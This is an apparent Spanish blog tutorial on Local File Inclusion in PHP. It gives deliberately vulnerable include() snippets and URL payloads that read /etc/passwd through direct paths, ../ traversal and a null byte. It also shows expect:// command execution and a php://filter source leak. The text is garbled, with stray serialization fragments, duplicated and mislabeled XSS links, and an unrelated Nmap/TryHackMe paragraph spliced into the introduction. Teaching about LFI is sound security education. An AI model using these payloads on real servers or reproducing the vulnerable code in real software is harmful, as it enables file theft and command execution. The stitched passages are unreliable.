I"9<p>La vulnerabilidad <em>Local File Inclusion</em>, <em>LFI</em> por sus siglas en inglés, permite a un atacante leer archivos del servidor vulnerable. Esta afección se produce debido a malas prácticas durante la programación de una página web.</p>

<p>Dependiendo de la gravedad, esta vulnerabilidad puede llevar al atacante a:</p>

<ul>
  <li>RCE (Remote Code Execution)</li>
  <li><a href="https://mateonitro550.github.io/Cross-Site-Scripting-(XSS)">XSS</a> (Cross-Site Scripting)</li>
  <li>DoS (Denial Of Service)</li>
</ul>

<p><a href="https://mateonitro550.github.io/Cross-Site-Scripting-%28XSS%29">XSS</a></p>

<p><a href="https://mateonitro550.github.io/Cross-Site-Scripting-(XSS)">XSS</a></p>

<p><a href="https://mateonitro550.github.io/Explore-Hack-The-Box">XSS</a></p>

<p>Primeramente, vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos están abiertos así como identificar la versión y servicios que corren en el activo. Es importante aclarar que así como menciona la plataforma de <em>TryHackMe</em>, existen diversos <a href="https://www.stationx.net/nmap-cheat-sheet/">cheatsheets</a> que podemos encontrar en internet, cuyo principal objetivo es darnos a conoc  er cuales son todas las posiblidades que nos ofrece la herramienta.</p>

<p>Un ejemplo muy básico sería el siguiente script en <em>PHP</em>.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
	<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
	<span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Script, del que podemos abusar para leer cualquier archivo del sistema, en este caso el <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>localhost/lfi.php?filename=/etc/passwd
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-13-Local-File-Inclusion-(LFI)/1.png" alt="" /></p>

<p>Es importante aclarar que esta no es solo una vulnerabilidad de <em>PHP</em>, también está presente en otros lenguajes como lo es <em>JSP</em> o <em>ASP</em>.</p>

<h3 id="directory-path-traversal"><a href="#header-3"></a>Directory Path Traversal</h3>

<p>Es posible que en el código, se nos limite a acceder a archivos que se ubican únicamente en una ruta preestablecida en el script, en este caso <code class="language-plaintext highlighter-rouge">/var/www/html/</code>.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
	<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
	<span class="k">include</span><span class="p">(</span><span class="s2">"/var/www/html/"</span> <span class="mf">.</span> <span class="nv">$file</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Sin embargo, podemos “escaparnos” de la ruta preestablecida si añadimos <code class="language-plaintext highlighter-rouge">../</code> en nuestra cadena de ataque, pudiendo así listar contenido más allá de <code class="language-plaintext highlighter-rouge">/var/www/html/</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>localhost/lfi.php?filename=../../../etc/passwd
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-13-Local-File-Inclusion-(LFI)/2.png" alt="" /></p>

<h3 id="null-byte"><a href="#header-3"></a>Null Byte</h3>

<p>De igual manera, es posible que en el código se nos limite a acceder a archivos de determinada extensión, en este caso archivos de extensión <code class="language-plaintext highlighter-rouge">.php</code>.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
	<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
        <span class="k">include</span><span class="p">(</span><span class="nv">$file</span> <span class="mf">.</span> <span class="s2">".php"</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>De modo que cuando intentemos leer el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, o cualquier otro archivo del sistema, lo que estariamos leyendo en realidad sería el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd.php</code>, el cual no existe.</p>

<p>Sin embargo, si añadimos el nullbyte <code class="language-plaintext highlighter-rouge">%00</code> al final de nuestra cadena de ataque, el <code class="language-plaintext highlighter-rouge">.php</code> no será tenido en cuenta, pudiendo así leer con normalidad el <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, o cualquier otro archivo del sistema.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>localhost/lfi.php?filename=/etc/passwd%00
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-13-Local-File-Inclusion-(LFI)/3.png" alt="" /></p>

<h3 id="wrappers"><a href="#header-3"></a>Wrappers</h3>

<p><em>PHP</em> cuenta con una serie de <em>wrappers</em>, los cuales a menudo pueden ser abusados; por mencionar algunos tenemos:</p>

<h4 id="expect"><a href="#header-4"></a>expect://</h4>

<p>Nos permite una ejecución remota de comandos (RCE); cabe aclarar que este <em>wrapper</em> no está activado por defecto, por lo que no siempre será posible utilizarlo.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>localhost/lfi.php?filename=expect://whoami
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-13-Local-File-Inclusion-(LFI)/4.png" alt="" /></p>

<h4 id="filter"><a href="#header-4"></a>filter://</h4>

<p>Nos permite codificar archivos del sistema a través de diferentes métodos como podría ser <em>Base64</em> o <em>ROT13</em>.</p>

<p>Este <em>wrapper</em> resulta bastante útil si necesitamos leer un archivo en <em>PHP</em>, ya que recordemos, este es un lenguaje interpretado, por lo que si intentáramos leer un archivo <em>PHP</em> del servidor vulnerable, lo que veríamos sería simplemente el output del script.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-13-Local-File-Inclusion-(LFI)/5.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>localhost/lfi.php?filename=php://filter/convert.base64-encode/resource=filterWrapper.php
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-13-Local-File-Inclusion-(LFI)/6.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-13-Local-File-Inclusion-(LFI)/7.png" alt="" /></p>
:ET